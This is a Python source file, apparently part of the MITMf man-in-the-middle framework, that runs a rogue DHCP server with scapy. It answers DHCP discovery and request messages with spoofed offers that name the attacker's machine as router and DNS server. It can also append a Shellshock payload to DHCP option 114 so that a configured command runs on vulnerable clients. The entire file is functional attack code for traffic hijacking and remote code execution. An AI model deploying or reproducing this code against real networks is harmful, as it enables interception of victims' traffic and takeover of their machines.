import logging
import threading
import binascii
import random

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

mitmf_logger = logging.getLogger('mitmf')

class DHCPServer():

	def __init__(self, interface, dhcpcfg, ip, mac):
		self.interface   = interface
		self.ip_address  = ip
		self.mac_address = mac
		self.shellshock  = None
		self.debug       = False
		self.dhcpcfg     = dhcpcfg
		self.rand_number = []
		self.dhcp_dic    = {}

	def start(self):
		t = threading.Thread(name="dhcp_spoof", target=self.dhcp_sniff, args=(self.interface,))
		t.setDaemon(True)
		t.start()

	def dhcp_sniff(self, interface):
		sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=interface)

	def dhcp_rand_ip(self):
		pool = self.dhcpcfg['ip_pool'].split('-')
		trunc_ip = pool[0].split('.'); del(trunc_ip[3])
		max_range = int(pool[1])
		min_range = int(pool[0].split('.')[3])
		number_range = range(min_range, max_range)
		for n in number_range:
			if n in self.rand_number:
				number_range.remove(n)
		rand_number = random.choice(number_range)
		self.rand_number.append(rand_number)
		rand_ip = '.'.join(trunc_ip) + '.' + str(rand_number)

		return rand_ip

	def dhcp_callback(self, resp):
		if resp.haslayer(DHCP):
			xid = resp[BOOTP].xid
			mac_addr = resp[Ether].src
			raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
			if xid in self.dhcp_dic.keys():
				client_ip = self.dhcp_dic[xid]
			else:
				client_ip = self.dhcp_rand_ip()
				self.dhcp_dic[xid] = client_ip

			if resp[DHCP].options[0][1] is 1:
				mitmf_logger.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
				mitmf_logger.info("Sending DHCP OFFER")
				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
				IP(src=self.ip_address, dst='255.255.255.255') /
				UDP(sport=67, dport=68) /
				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
				DHCP(options=[("message-type", "offer"),
					('server_id', self.ip_address),
					('subnet_mask', self.dhcpcfg['subnet']),
					('router', self.ip_address),
					('lease_time', 172800),
					('renewal_time', 86400),
					('rebinding_time', 138240),
					"end"]))

				try:
					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
				except KeyError:
					pass

				sendp(packet, iface=self.interface, verbose=self.debug)

			if resp[DHCP].options[0][1] is 3:
				mitmf_logger.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
				IP(src=self.ip_address, dst='255.255.255.255') /
				UDP(sport=67, dport=68) /
				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
				DHCP(options=[("message-type", "ack"),
					('server_id', self.ip_address),
					('subnet_mask', self.dhcpcfg['subnet']),
					('router', self.ip_address),
					('lease_time', 172800),
					('renewal_time', 86400),
					('rebinding_time', 138240)]))

				try:
					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
				except KeyError:
					pass

				if self.shellshock:
					mitmf_logger.info("Sending DHCP ACK with shellshock payload")
					packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
					packet[DHCP].options.append("end")
				else:
					mitmf_logger.info("Sending DHCP ACK")
					packet[DHCP].options.append("end")

				sendp(packet, iface=self.interface, verbose=self.debug)